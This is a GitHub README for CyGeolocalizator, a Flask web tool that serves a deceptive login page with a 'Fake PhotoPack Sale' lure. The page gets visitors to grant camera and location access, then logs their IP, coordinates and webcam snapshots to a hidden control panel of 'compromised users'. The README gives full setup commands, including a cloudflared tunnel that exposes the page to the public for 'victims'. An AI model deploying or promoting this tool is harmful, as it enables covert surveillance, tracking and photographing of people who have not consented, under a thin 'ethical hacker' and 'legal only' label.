![GitHub release downloads](https://img.shields.io/github/downloads/CyberiusCompany/Cyberius-Unzip-Cracker/latest/total)
![Version](https://img.shields.io/badge/version-1.0.0-blue)
![System](https://img.shields.io/badge/windows-x64-green)
![System](https://img.shields.io/badge/linux-x64-green)
![License](https://img.shields.io/badge/license-Private-red)
![Usage](https://img.shields.io/badge/usage-legal%20only-important)
![Python](https://img.shields.io/badge/python-3.7%2B-yellow)
![Tested on](https://img.shields.io/badge/tested%20on-Windows%2010%2F11%20%7C%20Ubuntu%2022.04-blue)

<p align="center">
  <a href="https://github.com/cyberiuscompany/CyGeolocalizator">
    <img src="https://flagcdn.com/w40/es.png" alt="Español" title="Español">
    <strong>Español</strong>
  </a>
  &nbsp;|&nbsp;
  <img src="https://flagcdn.com/w40/us.png" alt="English" title="English">
  <strong>English</strong>
  &nbsp;|&nbsp;
  <a href="https://www.youtube.com/watch?v=xvFZjo5PgG0&list=RDxvFZjo5PgG0&start_radio=1&pp=ygUTcmljayByb2xsaW5nIG5vIGFkc6AHAQ%3D%3D">
    <img src="https://flagcdn.com/w40/jp.png" alt="Japanese" title="Japanese">
    <strong>日本語</strong>
  </a>
</p>

# CYGEOLOCALIZATOR
A tracking, visual intelligence and location analysis tool.

---

<p align="center">
  <img src="icono.png" alt="Banner" width="500"/>
</p>

---

## ⚙️ What does it do?

`CyGeolocalizator` is a Flask web application that enables:

- 🔐 Login with access control (admin/admin by default)
- 🌍 Real-time public IP and geolocation capture
- 📸 Device camera snapshot capture
- 🧠 Coordinates and timestamp logging
- 📊 Data visualization in Excel-style dashboard
- 🌐 Secure exposure via `trycloudflare.com` tunnel

---

## 📸 TOOL SCREENSHOTS

### 📸 Tool Deployment
<p align="center">
  <img src="despliegue_de_la_herramienta.png" alt="Deployment" width="900"/>
</p>

### 📸 Login requesting browser permissions
<p align="center">
  <img src="herramienta pediendo permisos de ubicacion y camara.png" alt="Permissions" width="500"/>
</p>

### 📸 Results after login + Fake PhotoPack Sale (Usable)
<p align="center">
  <img src="resultado tras el login venta de foto pack.png" alt="Result + Sale" width="500"/>
</p>

### 📸 Hidden control panel (No Photo)
<p align="center">
  <img src="panel control usuarios comprometidos.png" alt="Panel No Photo" width="500"/>
</p>

### 📸 Hidden control panel (With Photo)
<p align="center">
  <img src="caso con foto de la webcam.png" alt="Panel With Photo" width="500"/>
</p>

### 📸 Victim Photo Zoom (Right Click > View Image)
<p align="center">
  <img src="foto zoom.png" alt="Zoom" width="500"/>
</p>

---

## 🏗️ Project Structure

```bash
📁 CyGeolocalizator/
├── login.html # Access page
├── main.html # Content download page
├── panel-de-control.html # Records panel
├── server.py # Flask backend
├── funciones.js # Frontend logic
├── estilos.css # Visual styles
├── start.sh / stop.sh # Execution scripts
├── requirements.txt # Dependencies
├── fotos.zip # Downloadable pack
└── logs/ # Flask and Cloudflare logs
```

## 💾 Tool Requirements

- Python 3.8+
- Browser with camera and geolocation permissions
- Dependencies (auto-installed via start.sh)

---

## 📄 Additional Documentation

- [🔐 Security](.github/SECURITY.md)
- [📜 License](LICENSE)
- [🤝 Code of Conduct](.github/CODE_OF_CONDUCT.md)
- [📬 Contributing](.github/CONTRIBUTING.md)
- [📢 Support](.github/SUPPORT.md)
- [⚠️ Legal Notice](DISCLAIMER.md)

---

## ⚙️ 1.1 Basic Installation 🪟 Windows

```bash
git clone https://github.com/cyberiuscompany/CyGeolocalizator.git
cd CyGeolocalizator
python3 -m venv venv (Optional)
.\venv\Scripts\activate (Optional)
pip install -r requirements.txt
python server.py

Access: https://IP:PORT/login.html (For users)
Access: https://IP:PORT/panel-de-control.html (For the ethical hacker)
```

## ⚙️ 1.2 Basic Installation 🐧 Linux / macOS

```bash
git clone https://github.com/cyberiuscompany/CyGeolocalizator.git
cd CyGeolocalizator
python3 -m venv venv (Optional)
source venv/bin/activate (Optional)
pip install -r requirements.txt
python server.py

Access: https://IP:PORT/login.html (For users)
Access: https://IP:PORT/panel-de-control.html (For the ethical hacker)
```

## ⚙️ 2.1 Tunnel Installation on Unix 🐧 (To make it public)

```bash
git clone https://github.com/cyberiuscompany/CyGeolocalizator.git
cd CyGeolocalizator
python3 -m venv venv (Optional)
source venv/bin/activate (Optional)
pip install -r requirements.txt
sudo iptables -A INPUT -p tcp --dport 5000 -j ACCEPT
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
sudo mv cloudflared-linux-amd64 /usr/local/bin/cloudflared
sudo chmod +x /usr/local/bin/cloudflared
cloudflared --version
sudo bash start.sh
sudo bash stop.sh

Access: https://CLOUDFLARED-DOMAIN/login.html (For users)
Access: https://CLOUDFLARED-DOMAIN/panel-de-control.html (For the ethical hacker)
```

## ⚙️ 2.2 Tunnel Installation on Windows 🪟 (To make it public)

```bash
# First terminal:
git clone https://github.com/cyberiuscompany/CyGeolocalizator.git
cd CyGeolocalizator
python3 -m venv venv (Optional)
source venv/bin/activate (Optional)
pip install -r requirements.txt
python server.py

# Second terminal:
Download: https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe 
Rename to: cloudflared.exe
cloudflared.exe --version
cloudflared.exe tunnel --url http://localhost:80

Access: https://CLOUDFLARED-DOMAIN (For users/victim)
Access: https://CLOUDFLARED-DOMAIN/panel-de-control.html (For the ethical hacker)
```
